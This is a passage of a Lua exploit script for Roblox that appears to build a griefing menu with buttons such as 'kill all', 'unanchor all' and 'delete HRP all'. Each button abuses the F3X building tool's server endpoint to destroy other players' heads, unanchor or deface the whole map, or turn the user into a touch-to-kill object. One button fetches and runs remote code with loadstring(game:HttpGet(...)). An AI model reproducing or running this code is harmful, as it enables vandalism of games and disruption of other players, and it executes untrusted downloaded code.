	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function Sky(id)
		e = char.HumanoidRootPart.CFrame.x
		f = char.HumanoidRootPart.CFrame.y
		g = char.HumanoidRootPart.CFrame.z
		CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
		for i,v in game.Workspace:GetDescendants() do
			if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
				--spawn(function()
				SetName(v,"Sky")
				AddMesh(v)
				--end)
				--spawn(function()
				SetMesh(v,"111891702759441")
				SetTexture(v,id)
				--end)
				MeshResize(v,Vector3.new(3600, 3600, 3600))
				SetLocked(v,true)
			end
		end
	end
	Sky("17291005664")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.58, 1, 0.38, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "cat decal"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function SpawnDecal(part,side)
		local args = {
			[1] = "CreateTextures",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal"
				}
			}
		}

		_(args)
	end
	function AddDecal(part,asset,side)
		local args = {
			[1] = "SyncTexture",
			[2] = {
				[1] = {
					["Part"] = part,
					["Face"] = side,
					["TextureType"] = "Decal",
					["Texture"] = "rbxassetid://".. asset
				}
			}
		}
		_(args)
	end

	function spam(id)
		for i,v in game.workspace:GetDescendants() do
			if v:IsA("BasePart") then
				spawn(function()
					SetLocked(v,false)
					SpawnDecal(v,Enum.NormalId.Front)
					AddDecal(v,id,Enum.NormalId.Front)

					SpawnDecal(v,Enum.NormalId.Back)
					AddDecal(v,id,Enum.NormalId.Back)

					SpawnDecal(v,Enum.NormalId.Right)
					AddDecal(v,id,Enum.NormalId.Right)

					SpawnDecal(v,Enum.NormalId.Left)
					AddDecal(v,id,Enum.NormalId.Left)

					SpawnDecal(v,Enum.NormalId.Bottom)
					AddDecal(v,id,Enum.NormalId.Bottom)

					SpawnDecal(v,Enum.NormalId.Top)
					AddDecal(v,id,Enum.NormalId.Top)
				end)
			end
		end 
	end
	spam("17291005664")
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.77, 1, 0.38, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "kill all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end

	function KillAll()
		for i,v in game.Players:GetPlayers() do
			spawn(function()
				SetLocked(v.Character.Head,false)
				DestroyPart(v.Character.Head)
			end)
		end
	end
	KillAll()
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.01, 1, 0.45, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "illminati the killer"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 19
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	local player = game.Players.LocalPlayer
	local char = player.Character

	function xd()
		spawn(function()
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = game:GetService("Players").LocalPlayer.Character.Torso,
						["Transparency"] = 1
					},
					[2] = {
						["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Leg"),
						["Transparency"] = 1
					},
					[3] = {
						["Part"] = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
						["Transparency"] = 1
					},
					[4] = {
						["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Leg"),
						["Transparency"] = 1
					},
					[5] = {
						["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Arm"),
						["Transparency"] = 1
					},
					[6] = {
						["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Arm"),
						["Transparency"] = 1
					},
					[7] = {
						["Part"] = game:GetService("Players").LocalPlayer.Character.Head,
						["Transparency"] = 1
					},
				}
			}

			_(args)

		end)
	end

	function Thomas(player)
		SetAnchor(true,char.HumanoidRootPart)
		CreatePart(char.HumanoidRootPart.CFrame,char,"Normal")
		SetCollision(char.Part,true)
		SetLocked(char.Part,false)
		Resize(char.Part,Vector3.new(5,5,10),char.HumanoidRootPart.CFrame)
		CreateSpotlight(char.Part)
		SyncLighting(char.Part,10)
		SetLocked(char.HumanoidRootPart,false)
		Weld(char.Part,char.HumanoidRootPart,char.Part)
		SetAnchor(false,char.Part)
		AddMesh(char.Part)
		MeshResize(char.Part,Vector3.new(1.5,1.5,1.5))
		SetMesh(char.Part,"117431434795088")
		SetTexture(char.Part,"108324185480331")
		SetAnchor(false,char.HumanoidRootPart)
		char.Humanoid.WalkSpeed = 65
		local function SFX(id) local s=Instance.new("Sound",char.Torso); s.SoundId = "rbxassetid://"..id; s.Volume = 1; return s; end
		char.Part.Touched:connect(function(p)
			if p.Parent then
				if p.Parent:IsA("Model") then
					if game.Players:FindFirstChild(p.Parent.Name) then
						if p.Parent.Name ~= game.Players.LocalPlayer.Name then
							spawn(function()
								DestroyPart(game.Players:FindFirstChild(p.Parent.Name).Character.Head)
							end)
							local Whistle = SFX(6346074926)
							Whistle:Play()
						end
					end
				end
			end
		end)

		local Music = SFX(0)
		Music.Pitch = 0
		Music:Play()

		game:GetService("RunService").RenderStepped:Connect(function()
			for i,v in char:GetDescendants() do
				if v:IsA("BasePart") then
					char.Humanoid.WalkSpeed = 100
					v.CanCollide = false
				end
			end
		end)
	end
	Thomas(player)
	xd()
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.20, 1, 0.45, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "unanchor all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 18
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = workspace.Part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end

	function Unanchor()
		for i,v in game.Workspace:GetDescendants() do
			spawn(function()
				SetLocked(v,false)
				SetAnchor(false,v)
			end)
		end
	end
	Unanchor()
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.39, 1, 0.45, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "no animations all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 18
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = true
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
		local args = {
			[1] = "SyncColor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Color"] = color --[[Color3]],
					["UnionColoring"] = false
				}
			}
		}
		_(args)
	end
	function ClonePart(part)
		local args = {
			[1] = "Clone",
			[2] = {
				[1] = part
			},
			[3] = workspace
		}

		_(args)
	end

	function torsoclone(player)
		char = player.Character
		ClonePart(char.Torso)
	end

	for i,v in game.Players:GetPlayers() do
		--spawn(function()
		pcall(function()
			torsoclone(v)
		end)
		--end)
	end
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.58, 1, 0.45, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.TextScaled = true
f3x.Text = "delete HRP all"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 18
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local F3X = loadstring(game:HttpGet("https://raw.githubusercontent.com/rusello25/scripts/main/F3X%20Module"))()

	for _,player in pairs(game.Players:GetPlayers()) do
		spawn(function()
			F3X.Edit(player.Character:GetChildren(), {})


			F3X.Object(player.Character.HumanoidRootPart):Destroy()
			F3X.Object(player.Character.Humanoid).Sit = true
		end)
	end
end)
local f3x = Instance.new("TextButton")
f3x.Size = UDim2.new(0, 90, 0, 40)
f3x.Position = UDim2.new(0.77, 1, 0.45, 0)
f3x.BackgroundColor3 = Color3.new(0, 0, 0)
f3x.BorderSizePixel = 1
f3x.BorderColor3 = Color3.new(1, 9, 0)
f3x.Font = Enum.Font.Arial
f3x.Text = "c00lify"
f3x.TextColor3 = Color3.new(1, 1, 1)
f3x.TextSize = 20
f3x.Parent = mainFrame

f3x.MouseButton1Click:Connect(function()
	local player = game.Players.LocalPlayer
	local char = player.Character
	local tool
	for i,v in player:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	for i,v in game.ReplicatedStorage:GetDescendants() do
		if v.Name == "SyncAPI" then
			tool = v.Parent
		end
	end
	remote = tool.SyncAPI.ServerEndpoint
	function _(args)
		remote:InvokeServer(unpack(args))
	end
	function SetCollision(part,boolean)
		local args = {
			[1] = "SyncCollision",
			[2] = {
				[1] = {
					["Part"] = part,
					["CanCollide"] = boolean
				}
			}
		}
		_(args)
	end
	function SetAnchor(boolean,part)
		local args = {
			[1] = "SyncAnchor",
			[2] = {
				[1] = {
					["Part"] = part,
					["Anchored"] = boolean
				}
			}
		}
		_(args)
	end
	function CreatePart(cf,parent)
		local args = {
			[1] = "CreatePart",
			[2] = "Normal",
			[3] = cf,
			[4] = parent
		}
		_(args)
	end
	function DestroyPart(part)
		local args = {
			[1] = "Remove",
			[2] = {
				[1] = part
			}
		}
		_(args)
	end
	function MovePart(part,cf)
		local args = {
			[1] = "SyncMove",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf
				}
			}
		}
		_(args)
	end
	function Resize(part,size,cf)
		local args = {
			[1] = "SyncResize",
			[2] = {
				[1] = {
					["Part"] = part,
					["CFrame"] = cf,
					["Size"] = size
				}
			}
		}
		_(args)
	end
	function AddMesh(part)
		local args = {
			[1] = "CreateMeshes",
			[2] = {
				[1] = {
					["Part"] = part
				}
			}
		}
		_(args)
	end

	function SetMesh(part,meshid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["MeshId"] = "rbxassetid://"..meshid
				}
			}
		}
		_(args)
	end
	function SetTexture(part, texid)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["TextureId"] = "rbxassetid://"..texid
				}
			}
		}
		_(args)
	end
	function SetName(part, stringg)
		local args = {
			[1] = "SetName",
			[2] = {
				[1] = part
			},
			[3] = stringg
		}

		_(args)
	end
	function MeshResize(part,size)
		local args = {
			[1] = "SyncMesh",
			[2] = {
				[1] = {
					["Part"] = part,
					["Scale"] = size
				}
			}
		}
		_(args)
	end
	function Weld(part1, part2,lead)
		local args = {
			[1] = "CreateWelds",
			[2] = {
				[1] = part1,
				[2] = part2
			},
			[3] = lead
		}
		_(args)

	end
	function SetLocked(part,boolean)
		local args = {
			[1] = "SetLocked",
			[2] = {
				[1] = part
			},
			[3] = boolean
		}
		_(args)
	end
	function SetTrans(part,int)
		local args = {
			[1] = "SyncMaterial",
			[2] = {
				[1] = {
					["Part"] = part,
					["Transparency"] = int
				}
			}
		}
		_(args)
	end
	function CreateSpotlight(part)
		local args = {
			[1] = "CreateLights",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight"
				}
			}
		}
		_(args)
	end
	function SyncLighting(part,brightness)
		local args = {
			[1] = "SyncLighting",
			[2] = {
				[1] = {
					["Part"] = part,
					["LightType"] = "SpotLight",
					["Brightness"] = brightness
				}
			}
		}
		_(args)
	end
	function Color(part,color)
